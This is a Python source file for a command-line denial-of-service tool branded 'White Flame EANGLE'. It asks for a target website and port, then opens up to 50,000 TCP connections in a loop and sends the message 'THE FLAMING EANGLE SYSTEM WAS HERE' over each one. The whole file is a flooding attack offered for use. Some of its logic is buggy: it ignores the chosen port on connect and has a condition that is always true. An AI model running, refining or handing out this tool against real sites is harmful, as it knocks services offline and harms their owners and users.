import os
import socket
import sys

from .banner import flag
from .mytimer import dynamic_countdown


def restart_program():
    python = sys.executable
    os.execl(python, python, * sys.argv)


class __Master_DDOS__():
    def __init__(self):

        self.message = b"WHITE FLAME, THE FLAMING EANGLE SYSTEM WAS HERE..."

    def banner():
        baner = """\
        |###################################################################|
        |###|               Author By : Wambua                          |###|
        |###|               code      : Python3                         |###|
        |###|               Team      : White Flame EANGLE              |###|
        |###################################################################|
        """
        print(f"\033[1;96m{baner}\033[0m")

    @staticmethod
    def get_data():
        try:
            print("\033[1;91minput web url \033[1;95m[ex : www.example.com ]")
            host = input("\033[1;94mWFE@root : \033[1;97m")
            print("\033[1;91minput port \033[1;95m[ex : 8080 ]")
            port = input("\033[1;94mWFE@root : \033[1;97m")
        except KeyboardInterrupt:
            print("\nExiting", flush=True)
            sys.exit()
        except Exception as e:
            print(e)
            __Master_DDOS__.get_data()

        if port == "":
            port = 80
            port = int(port)
        if host is None or host == '':
            print("Host can not be None")
            __Master_DDOS__.get_data()
        init = __Master_DDOS__()
        init.DDOS(host, port)
        return host, port

    def DDOS(self, host, port):
        try:
            # curdir = os.getcwd()
            if host is not None or host != '':
                connect = 50_000
                ip = socket.gethostbyname(host)

        except ValueError as e:
            print(e)
            sys.exit(1)
        except KeyboardInterrupt:
            print("\nExiting..")
            sys.exit(1)
        except Exception as e:
            print(e)

        print("\033[1;91mTarget ip\
            Host:[\033[1;93m" + host + "\033[0m]\
            Ip:  [\033[1;93m" + ip + "\033[0m]")

        dynamic_countdown(3)
        self.counter = 0
        for i in range(1, connect):
            try:
                self.counter += 1
                ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                ddos.connect((host, 80))
                ddos.send(self.message)
                ddos.sendto(self.message, (ip, port))
                ddos.send(self.message)
                print(
                    f"\033[1;92mSending \033[1;93m{self.counter} \033[1;92mpayload to \033[1;95m[" + ip + "] ...\033[0m", end="\r")
                ddos.close()
            except ConnectionResetError as e:
                print(e)
                sys.exc_info()
                sys.exit(1)
            except KeyboardInterrupt:
                print("\nExiting..")
                sys.exit(1)
            except socket.error:
                print("\033[1;91mConnection to [\033[1;93m" + ip + "]\033[0m failed ...")
                sys.exit()


def main():
    flag()
    __Master_DDOS__.banner()
    while True:
        try:
            __Master_DDOS__.get_data()
        except KeyboardInterrupt:
            print("\nExiting")
            sys.exit()
        except Exception as e:
            print(f"\033[93m{e}\033[0m")
            __Master_DDOS__.get_data()


if __name__ == "__main__":
    main()
